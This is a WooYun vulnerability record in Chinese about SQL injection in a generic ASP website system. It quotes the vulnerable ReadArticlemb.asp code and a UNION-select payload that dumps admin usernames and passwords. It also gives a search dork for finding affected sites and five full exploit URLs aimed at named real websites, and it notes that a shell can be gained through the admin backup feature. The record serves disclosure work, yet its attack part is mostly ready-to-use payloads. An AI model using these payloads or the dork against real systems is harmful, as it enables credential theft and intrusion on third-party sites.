{"id": 52756, "wybug_id": "wooyun-2014-070254", "wybug_title": "某通用型asp企业建站 sql注入漏洞", "wybug_corp": "某通用型asp企业建站系统", "wybug_author": "roker", "wybug_date": "2014-07-30 11:17", "wybug_open_date": "2014-10-28 11:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-28：\t细节向公众公开  简要描述： rt 详细说明：  http://www.xusoft09.cn/ReadArticlemb.asp\n<%Dim idid=request.querystring(\"id\")Set rs = Server.Createobject(\"ADODB.recordset\")asql=\"select  *   from   Article  where id=\"&id&\"   order by id desc\"rs.open asql,Cnresponse.write asqlif  rs.eof and  rs.bof thenresponse.write\"该内容不存在!\"response.endelsedatetime=rs(\"date\")title_5=rs(\"title\")IDD_5=rs(\"id\")LeftTitle_5=left(title_5,12)BigClass_5=rs(\"BigClass\")Pathfilename=rs(\"Pathfilename\")Article=rs(\"Article\")KeyWords=rs(\"KeyWords\")Description=rs(\"Description\")NoClass=rs(\"NoClass\")Set rs1 = Server.Createobject(\"ADODB.recordset\")asql1=\"select  *   from   BigClass  where ClassCode='\"&BigClass_5&\"'   order by id desc\"rs1.open asql1,CnBigClass08=rs1(\"BigClass\")ClassCode08=rs1(\"ClassCode\")%><code>id没有过滤rs.open asql,Cn后 ClassCode有值时即可 union 爆用户密码，默认 a 是 有值的，也可以通过观察页面内容 来获取其值。exp : <code>ReadArticlemb.asp?id=2 and 1 = 2 union select 1,'a',nm,pw,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20%20from%20admin\n\n\n关键字 \ninurl:\"ReadArticlemb.asp\"\n\n\n提供5个实例 用以通用性证明http://www.jinjian.cn/ReadArticlemb.asp?id=343%20and%201%20=%202%20union%20select%201,%27a%27,nm,pw,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20%20from%20adminhttp://www.qgsb-zc.com/ReadArticlemb.asp?id=453%20and%201%20=%202%20union%20select%201,%27a%27,nm,pw,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20%20from%20adminhttp://www.hrb-hp.com/ReadArticlemb.asp?id=330%20and%201%20=%202%20union%20select%201,%27a%27,nm,pw,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20%20from%20adminhttp://www.hzy291.com/ReadArticlemb.asp?id=402%20and%201%20=%202%20union%20select%20nm,%27a%27,nm,pw,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20%20from%20adminhttp://www.syysjd.com/ReadArticlemb.asp?id=334%20and%201%20=%202%20union%20select%201,%27lanwan4%27,nm,pw,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20%20from%20admin后台备份数据改包 即可gethell   漏洞证明：  如上所述   修复方案：  过滤呗   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-07-30 14:29 厂商回复： CNVD暂无法建立与软件生产厂商的直接联系渠道，暂未列入处置流程，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-31 10:33 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  这么快就确定了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}